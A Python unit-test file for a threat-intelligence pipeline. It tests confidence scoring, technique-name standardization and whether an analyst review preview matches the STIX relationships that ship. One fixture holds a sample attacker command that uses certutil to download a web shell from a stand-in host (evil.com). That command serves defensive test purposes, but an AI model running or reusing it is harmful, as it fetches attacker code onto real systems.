"""Unit tests for the normalize node."""

import copy
from unittest.mock import AsyncMock, patch

import pytest
from dataclasses import asdict

from app.graph.state import (
    PipelineStatus,
    TechniqueMapping,
)
from app.nodes.deterministic.serialization import serialize_stix
from app.nodes.deterministic.normalization import (
    normalize,
    _standardize_names,
    _assess_context_completeness,
    WEIGHT_SOURCE_RELIABILITY,
    WEIGHT_CONTEXT_COMPLETENESS,
    WEIGHT_BEHAVIORAL_CONFIDENCE,
)


# ── normalize node function ───────────────────────────────────────


class TestNormalize:
    """Tests for the top-level LangGraph node function."""

    def test_filters_to_approved_drafts(self, sample_drafts):
        """Only approved drafts appear in normalized output."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": ["dft-001", "dft-003"],  # skip dft-002
            "source_reliability": 85,
        }
        result = normalize(state)

        assert result["status"] == PipelineStatus.NORMALIZING.value
        assert result["current_node"] == "normalize"
        ids = [d["draft_id"] for d in result["normalized_drafts"]]
        assert "dft-001" in ids
        assert "dft-003" in ids
        assert "dft-002" not in ids

    def test_all_drafts_approved(self, sample_drafts):
        """All three sample drafts appear when all are approved."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": ["dft-001", "dft-002", "dft-003"],
            "source_reliability": 85,
        }
        result = normalize(state)
        assert len(result["normalized_drafts"]) == 3

    def test_no_approved_drafts(self, sample_drafts):
        """Empty approved list returns empty normalized_drafts."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": [],
            "source_reliability": 85,
        }
        result = normalize(state)

        assert result["normalized_drafts"] == []
        assert result["status"] == PipelineStatus.NORMALIZING.value

    def test_composite_confidence_present(self, sample_drafts):
        """Every normalized draft has a composite_confidence score."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": [d["draft_id"] for d in sample_drafts],
            "source_reliability": 85,
        }
        result = normalize(state)

        for nd in result["normalized_drafts"]:
            assert "composite_confidence" in nd
            assert 0 <= nd["composite_confidence"] <= 100

    def test_confidence_breakdown_structure(self, sample_drafts):
        """Confidence breakdown contains expected keys."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": ["dft-001"],
            "source_reliability": 85,
        }
        result = normalize(state)

        bd = result["normalized_drafts"][0]["confidence_breakdown"]
        assert bd["source_reliability"] == 85
        assert "context_completeness" in bd
        assert "behavioral_confidence" in bd
        assert "weights" in bd
        assert bd["weights"]["source_reliability"] == WEIGHT_SOURCE_RELIABILITY

    def test_standardized_names_present(self, sample_drafts):
        """Normalized drafts include standardized_names dict."""
        state = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": [d["draft_id"] for d in sample_drafts],
            "source_reliability": 85,
        }
        result = normalize(state)

        for nd in result["normalized_drafts"]:
            assert "standardized_names" in nd

    def test_source_reliability_affects_confidence(self, sample_drafts):
        """Higher source_reliability increases composite confidence."""
        draft_ids = [d["draft_id"] for d in sample_drafts]

        state_low = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": draft_ids,
            "source_reliability": 20,
        }
        state_high = {
            "drafts": sample_drafts,
            "gate1_approved_draft_ids": draft_ids,
            "source_reliability": 95,
        }

        result_low = normalize(state_low)
        result_high = normalize(state_high)

        for i in range(len(result_low["normalized_drafts"])):
            assert (
                result_high["normalized_drafts"][i]["composite_confidence"]
                >= result_low["normalized_drafts"][i]["composite_confidence"]
            )


# ── _standardize_names ────────────────────────────────────────────


class TestStandardizeNames:
    """Tests for the name standardization function."""

    def test_powershell_normalization(self):
        """'powershell' -> 'PowerShell'."""
        draft = {
            "techniques": [
                asdict(TechniqueMapping(
                    technique_id="T1059.001",
                    technique_name="powershell",
                    tactic="execution",
                    confidence=0.8,
                ))
            ],
            "platforms": [],
        }
        mappings = _standardize_names(draft)
        assert mappings.get("powershell") == "PowerShell"

    def test_cobalt_strike_normalization(self):
        """'cobalt strike' -> 'Cobalt Strike'."""
        draft = {
            "techniques": [
                asdict(TechniqueMapping(
                    technique_id="S0154",
                    technique_name="cobalt strike",
                    tactic="command-and-control",
                    confidence=0.9,
                ))
            ],
            "platforms": [],
        }
        mappings = _standardize_names(draft)
        assert mappings.get("cobalt strike") == "Cobalt Strike"

    def test_already_canonical_no_mapping(self):
        """Already canonical names don't appear in mappings."""
        draft = {
            "techniques": [
                asdict(TechniqueMapping(
                    technique_id="T1190",
                    technique_name="Exploit Public-Facing Application",
                    tactic="initial-access",
                    confidence=0.85,
                ))
            ],
            "platforms": [],
        }
        mappings = _standardize_names(draft)
        # This name isn't in the canonical dict, so no mapping
        assert len(mappings) == 0

    def test_cmd_normalization(self):
        """'cmd' -> 'Windows Command Shell'."""
        draft = {
            "techniques": [
                asdict(TechniqueMapping(
                    technique_id="T1059.003",
                    technique_name="cmd",
                    tactic="execution",
                    confidence=0.7,
                ))
            ],
            "platforms": [],
        }
        mappings = _standardize_names(draft)
        assert mappings.get("cmd") == "Windows Command Shell"

    def test_empty_techniques(self):
        """Draft with no techniques produces empty mappings."""
        draft = {"techniques": [], "platforms": []}
        mappings = _standardize_names(draft)
        assert mappings == {}


# ── _assess_context_completeness ──────────────────────────────────


class TestAssessContextCompleteness:
    """Tests for the context completeness scorer."""

    def test_full_context_high_score(self):
        """A well-populated draft gets a high score."""
        draft = {
            "description": "The actor exploited CVE-2023-46604 to gain initial "
                           "access via Apache ActiveMQ. The exploit leveraged "
                           "ClassInfo deserialization to execute shell commands.",
            "raw_command_lines": ["certutil.exe -urlcache -split -f http://evil.com/shell.jsp"],
            "techniques": [
                {"technique_id": "T1190", "technique_name": "Exploit Public-Facing Application"},
                {"technique_id": "T1059.003", "technique_name": "Windows Command Shell"},
            ],
            "first_observed": "2023-10-25T00:00:00Z",
            "source_refs": ["identity--abc123"],
            "platforms": ["windows::server"],
            "detail_gap": False,
        }
        score = _assess_context_completeness(draft)
        # description >100 chars = 25, cmd_lines = 25, 2 techniques = 20,
        # first_observed = 10, source_refs = 10, platforms = 5, no detail_gap = 5
        assert score == 100

    def test_empty_draft_low_score(self):
        """An empty draft scores only the no-detail-gap bonus (5)."""
        draft = {}
        score = _assess_context_completeness(draft)
        # Empty dict: detail_gap defaults to False -> +5
        assert score == 5

    def test_description_only_partial(self):
        """Short description gets partial credit + no-detail-gap bonus."""
        draft = {"description": "Actor exploited a vulnerability."}
        score = _assess_context_completeness(draft)
        # 30 < len(34) < 100 -> 15 points + no detail_gap -> +5 = 20
        assert score == 20

    def test_detail_gap_penalty(self):
        """detail_gap=True removes the 5-point bonus."""
        draft_no_gap = {
            "description": "Some description that is moderately long for testing purposes.",
            "detail_gap": False,
        }
        draft_with_gap = {
            "description": "Some description that is moderately long for testing purposes.",
            "detail_gap": True,
        }
        score_no = _assess_context_completeness(draft_no_gap)
        score_yes = _assess_context_completeness(draft_with_gap)
        assert score_no == score_yes + 5

    def test_command_lines_boost(self):
        """Having command lines adds 25 points."""
        base = {"description": "x" * 101}  # 25 pts
        with_cmd = {**base, "raw_command_lines": ["whoami"]}
        assert _assess_context_completeness(with_cmd) - _assess_context_completeness(base) == 25


class TestPreviewMatchesSerializer:
    """Gate 2 must show the analyst what will actually ship.

    The preview and the serializer build their edge lists independently, and
    they had drifted in both directions: the preview fanned malware/tools out
    to every procedure whose `*_used` list was empty (edges the serializer
    would never emit), then actors out to every procedure (128 rows where 14
    shipped), and showed procedure-level `targets` rows the serializer never
    emitted; six intrusion-set/campaign classes shipped with no preview at
    all. The tool/malware tests below are the original scope; the
    "reviewable set" tests pin EVERY reviewable class equal on both sides,
    with the non-reviewable remainder listed explicitly so a new class
    cannot slip in unreviewed.
    """

    # Every (source_type, verb, target_type) the preview offers for review.
    # A serializer edge in one of these classes must be previewed, and vice
    # versa.
    REVIEWABLE_CLASSES = {
        ("intrusion-set", "uses", "x-procedure"),
        ("x-procedure", "uses", "malware"),
        ("x-procedure", "uses", "tool"),
        ("x-procedure", "exploits", "vulnerability"),
        ("x-procedure", "precedes", "x-procedure"),
        ("campaign", "attributed-to", "intrusion-set"),
        ("intrusion-set", "attributed-to", "threat-actor"),
        ("intrusion-set", "targets", "identity"),
        ("intrusion-set", "targets", "location"),
        ("campaign", "targets", "location"),
        ("intrusion-set", "targets", "software"),
        ("campaign", "targets", "software"),
        ("intrusion-set", "exploits", "vulnerability"),
        ("campaign", "exploits", "vulnerability"),
    }
    # Everything else the serializer emits, by design not an analyst call:
    # the technique mapping is inherent (reviewed at the technique gate),
    # actor/campaign rollups are derived from the per-procedure edges, and
    # SCO linkage does not exist until serialization.
    EXCLUDED_CLASSES = {
        ("x-procedure", "uses", "attack-pattern"),
        ("intrusion-set", "uses", "tool"),
        ("intrusion-set", "uses", "malware"),
        ("intrusion-set", "uses", "attack-pattern"),
        ("campaign", "uses", "tool"),
        ("campaign", "uses", "malware"),
        ("campaign", "uses", "attack-pattern"),
    }
    EXCLUDED_VERBS = {"component-of", "has-observable", "detects", "has-analytic", "uses-data-component"}

    @staticmethod
    def _rich_state(sample_entities, sample_drafts):
        """Two intrusion sets, a threat actor, a victim org, a victim
        location, a software asset; drafts with attribution, a CVE, and a
        branch in the chunk DAG so a precedes edge is operator-routed."""
        from app.graph.state import Entity, EntityType, GateAction

        def ent(eid, etype, value, **extra):
            d = asdict(Entity(entity_id=eid, entity_type=etype, value=value,
                              confidence=0.9, gate_action=GateAction.APPROVE.value))
            d.update(extra)
            return d

        entities = copy.deepcopy(sample_entities) + [
            ent("ent-101", EntityType.INTRUSION_SET.value, "Contrast Group"),
            ent("ent-102", EntityType.THREAT_ACTOR.value, "Ministry of State Security"),
            ent("ent-103", EntityType.ORGANIZATION.value, "Acme Logistics", organization_role="victim"),
            ent("ent-104", EntityType.ORGANIZATION.value, "Proofpoint", organization_role="author"),
            ent("ent-105", EntityType.LOCATION.value, "Indonesia", location_role="victim"),
            ent("ent-106", EntityType.LOCATION.value, "China", location_role="origin"),
            ent("ent-107", EntityType.SOFTWARE.value, "Apache ActiveMQ"),
        ]
        drafts = copy.deepcopy(sample_drafts)
        drafts[0]["attributed_actors"] = ["LockBit 3.0"]
        drafts[0]["vulnerability_refs"] = ["ent-006"]
        drafts[1]["attributed_actors"] = []          # two isets present -> no actor edge
        drafts[1]["tools_used"] = ["certutil.exe"]
        drafts[2]["attributed_actors"] = ["Contrast Group"]
        drafts[2]["malware_used"] = ["Cobalt Strike"]
        fourth = copy.deepcopy(drafts[2])
        fourth.update({
            "draft_id": "dft-004", "chunk_id": "chk-004",
            "name": "Exfiltrate archive via rclone",
            "sequence_index": 4, "predecessor_indices": [2],
            "attributed_actors": ["LockBit 3.0"], "malware_used": [],
        })
        drafts.append(fourth)
        chunks = [
            {"chunk_id": "chk-001", "sequence_index": 1, "predecessor_indices": [], "precedes_ids": ["chk-002"]},
            {"chunk_id": "chk-002", "sequence_index": 2, "predecessor_indices": [1], "precedes_ids": ["chk-003", "chk-004"]},
            {"chunk_id": "chk-003", "sequence_index": 3, "predecessor_indices": [2], "precedes_ids": []},
            {"chunk_id": "chk-004", "sequence_index": 4, "predecessor_indices": [2], "precedes_ids": []},
        ]
        return {
            "gates_enabled": True,
            "metadata": {},
            "source_reliability": 85,
            "is_sequential": True,
            "validated_entities": entities,
            "drafts": drafts,
            "chunks": chunks,
            "gate1_approved_draft_ids": [d["draft_id"] for d in drafts],
        }

    @staticmethod
    def _reviewable_keys_from_preview(preview):
        return {
            (r["source_name"].lower(), r["relationship_type"], r["target_name"].lower(),
             r["source_type"], r["target_type"])
            for r in preview if r.get("reviewable")
        }

    @classmethod
    def _shipped_keys_from_bundle(cls, bundle):
        """Every SRO as a name-keyed 5-tuple, with `precedes` collapsed to the
        logical procedure -> procedure edge across operator/condition hops."""
        by_id = {o["id"]: o for o in bundle["objects"]}
        rels = [o for o in bundle["objects"] if o.get("type") == "relationship"]
        hops = {"attack-operator", "attack-condition"}
        succ: dict[str, list[str]] = {}
        for r in rels:
            if r["relationship_type"] == "precedes":
                succ.setdefault(r["source_ref"], []).append(r["target_ref"])
        # A ref whose object is not in the bundle (ATT&CK objects are not
        # embedded when the catalogue query is mocked) still has a type: the
        # STIX id prefix.
        def _type(ref):
            return by_id.get(ref, {}).get("type") or ref.split("--")[0]

        keys = set()
        for r in rels:
            src, tgt = by_id.get(r["source_ref"], {}), by_id.get(r["target_ref"], {})
            verb = r["relationship_type"]
            if verb == "precedes":
                if src.get("type") != "x-procedure":
                    continue  # hop-internal edge; expanded from its procedure source
                stack, seen, ends = [r["target_ref"]], set(), []
                while stack:
                    n = stack.pop()
                    if n in seen:
                        continue
                    seen.add(n)
                    if by_id.get(n, {}).get("type") in hops:
                        stack.extend(succ.get(n, []))
                    else:
                        ends.append(n)
                for e in ends:
                    keys.add(((src.get("name") or "").lower(), "precedes",
                              (by_id[e].get("name") or "").lower(), "x-procedure", by_id[e]["type"]))
                continue
            keys.add(((src.get("name") or "").lower(), verb, (tgt.get("name") or "").lower(),
                      _type(r["source_ref"]), _type(r["target_ref"])))
        return keys

    async def _preview_and_bundle(self, state):
        state = {**state, **normalize(state)}
        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            bundle = (await serialize_stix(state))["stix_bundle"]
        return state, bundle

    async def test_reviewable_preview_equals_shipped_bundle(
        self, sample_entities, sample_drafts,
    ):
        """The analyst reviews exactly the reviewable edges that ship."""
        state, bundle = await self._preview_and_bundle(
            self._rich_state(sample_entities, sample_drafts),
        )
        previewed = self._reviewable_keys_from_preview(state["relationship_preview"])
        shipped = self._shipped_keys_from_bundle(bundle)
        shipped_reviewable = {
            k for k in shipped if (k[3], k[1], k[4]) in self.REVIEWABLE_CLASSES
        }
        assert previewed - shipped_reviewable == set(), (
            f"preview promises edges the serializer never emits: {sorted(previewed - shipped_reviewable)}"
        )
        assert shipped_reviewable - previewed == set(), (
            f"serializer ships reviewable edges the analyst never saw: {sorted(shipped_reviewable - previewed)}"
        )
        # The fixture exercises the classes that drifted: per-draft actor
        # edges (not a fan-out), actor-level targets, gated exploits.
        assert ("lockbit 3.0", "uses", "exploit apache activemq via cve-2023-46604",
                "intrusion-set", "x-procedure") in previewed
        assert not any(k[0] == "contrast group" and k[1] == "uses"
                       and k[2] == "exploit apache activemq via cve-2023-46604" for k in previewed)
        assert ("lockbit 3.0", "targets", "acme logistics", "intrusion-set", "identity") in previewed
        assert not any(k[1] == "targets" and k[3] == "x-procedure" for k in previewed)
        assert not any(k[2] == "proofpoint" for k in previewed), "author orgs are not victims"
        assert not any(k[2] == "china" for k in previewed), "origin locations are not targets"
        assert ("lockbit 3.0", "exploits", "cve-2023-46604", "intrusion-set", "vulnerability") in previewed

    async def test_every_shipped_class_is_reviewable_or_declared_excluded(
        self, sample_entities, sample_drafts,
    ):
        """A new relationship class must be previewed or added to the
        exclusion list on purpose — never shipped unreviewed by accident."""
        _, bundle = await self._preview_and_bundle(
            self._rich_state(sample_entities, sample_drafts),
        )
        classes = {(k[3], k[1], k[4]) for k in self._shipped_keys_from_bundle(bundle)}
        unexpected = {
            c for c in classes
            if c not in self.REVIEWABLE_CLASSES
            and c not in self.EXCLUDED_CLASSES
            and c[1] not in self.EXCLUDED_VERBS
        }
        assert unexpected == set(), f"unreviewed relationship classes: {sorted(unexpected)}"

    async def test_removed_operator_routed_precedes_leaves_the_bundle(
        self, sample_entities, sample_drafts,
    ):
        """chk-002 branches to chk-003 and chk-004, so both edges ship through
        an OR operator. Removing the preview row for one of them must remove
        that logical edge, keep its sibling, and — with one output left — drop
        the operator itself."""
        state = self._rich_state(sample_entities, sample_drafts)
        state = {**state, **normalize(state)}
        assert state["chunk_operators"], "fixture must produce a branch operator"
        row = next(
            r for r in state["relationship_preview"]
            if r["relationship_type"] == "precedes"
            and r["source_name"] == "Download web shell via certutil"
            and r["target_name"] == "Exfiltrate archive via rclone"
        )
        state["gate2_removed_rel_ids"] = [row["id"]]
        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            bundle = (await serialize_stix(state))["stix_bundle"]
        shipped = self._shipped_keys_from_bundle(bundle)
        precedes = {(k[0], k[2]) for k in shipped if k[1] == "precedes"}
        assert ("download web shell via certutil", "exfiltrate archive via rclone") not in precedes
        assert ("download web shell via certutil", "execute cobalt strike beacon via powershell") in precedes
        assert not [o for o in bundle["objects"] if o.get("type") == "attack-operator"], (
            "a branch with one surviving arm is no branch; the operator must go"
        )

    @staticmethod
    def _state(sample_entities, sample_drafts):
        return {
            "gates_enabled": True,
            "metadata": {},
            "source_reliability": 85,
            "validated_entities": copy.deepcopy(sample_entities),
            "drafts": copy.deepcopy(sample_drafts),
            "gate1_approved_draft_ids": [d["draft_id"] for d in sample_drafts],
        }

    @staticmethod
    def _tool_malware_keys_from_preview(preview):
        return {
            (r["source_name"].lower(), r["target_name"].lower(), r["target_type"])
            for r in preview
            if r["source_type"] == "x-procedure"
            and r["target_type"] in ("tool", "malware")
        }

    @staticmethod
    def _tool_malware_keys_from_bundle(bundle):
        by_id = {o["id"]: o for o in bundle["objects"]}
        keys = set()
        for o in bundle["objects"]:
            if o.get("type") != "relationship" or o["relationship_type"] != "uses":
                continue
            src, tgt = by_id.get(o["source_ref"], {}), by_id.get(o["target_ref"], {})
            if src.get("type") == "x-procedure" and tgt.get("type") in ("tool", "malware"):
                keys.add((
                    (src.get("name") or "").lower(),
                    (tgt.get("name") or "").lower(),
                    tgt["type"],
                ))
        return keys

    async def test_preview_shows_no_edge_the_serializer_will_not_emit(
        self, sample_entities, sample_drafts,
    ):
        """No fiction: an analyst must not review an edge that cannot ship."""
        state = self._state(sample_entities, sample_drafts)
        state = {**state, **normalize(state)}
        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            bundle = (await serialize_stix(state))["stix_bundle"]

        previewed = self._tool_malware_keys_from_preview(
            state["relationship_preview"],
        )
        shipped = self._tool_malware_keys_from_bundle(bundle)
        assert previewed - shipped == set(), (
            "preview promises tool/malware edges the serializer never emits"
        )

    async def test_serializer_emits_no_tool_edge_the_preview_hid(
        self, sample_entities, sample_drafts,
    ):
        """And the reverse: nothing ships that the analyst never saw."""
        state = self._state(sample_entities, sample_drafts)
        state = {**state, **normalize(state)}
        with patch(
            "app.nodes.deterministic.serialization.run_query",
            new=AsyncMock(return_value=[]),
        ):
            bundle = (await serialize_stix(state))["stix_bundle"]

        previewed = self._tool_malware_keys_from_preview(
            state["relationship_preview"],
        )
        shipped = self._tool_malware_keys_from_bundle(bundle)
        assert shipped - previewed == set(), (
            "serializer ships tool/malware edges absent from the gate 2 preview"
        )

    def test_empty_tools_used_previews_no_tool_edges(
        self, sample_entities, sample_drafts,
    ):
        """The fan-out itself: empty means empty, not 'every tool in the source'.

        On one campaign source this branch put
        'Harvest Credentials via Voice Phishing --uses--> GNU shred'
        in front of the analyst.
        """
        drafts = copy.deepcopy(sample_drafts)
        for d in drafts:
            d["tools_used"] = []
            d["malware_used"] = []
        state = self._state(sample_entities, drafts)
        preview = normalize(state)["relationship_preview"]
        assert self._tool_malware_keys_from_preview(preview) == set()
